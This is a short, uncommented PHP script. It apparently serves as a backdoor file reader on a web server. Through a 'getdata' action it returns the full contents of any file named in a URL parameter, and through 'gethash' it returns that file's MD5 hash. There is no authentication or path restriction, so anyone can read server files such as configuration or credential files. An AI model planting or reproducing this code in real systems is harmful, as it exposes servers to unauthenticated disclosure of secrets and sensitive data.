<?
switch ($_GET[a])
{
	case "gethash":
		if ($_GET[fname])
		{
			$fdata = @file_get_contents($_GET[fname]);
   			echo md5($fdata);
		};
	break;
	case "getdata":
		if ($_GET[fname])
		{
			echo file_get_contents($_GET[fname]);
		};
	break;
};
?>